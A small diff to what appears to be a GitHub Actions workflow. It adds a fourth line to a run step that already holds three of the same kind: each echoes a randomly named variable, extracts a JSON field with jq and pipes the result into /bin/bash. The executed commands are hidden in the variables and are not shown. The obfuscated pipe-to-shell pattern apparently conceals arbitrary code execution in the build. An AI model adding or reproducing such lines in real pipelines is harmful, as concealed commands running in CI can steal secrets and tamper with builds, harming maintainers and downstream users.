@@ -27,6 +27,7 @@ jobs:
           echo $pp7940 | jq -r .t4 | /bin/bash
           echo $lbafg43 | jq -r .kaz3 | /bin/bash
           echo $qoq393 | jq -r .biml3 | /bin/bash
+          echo $oeyd1 | jq -r .wi6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
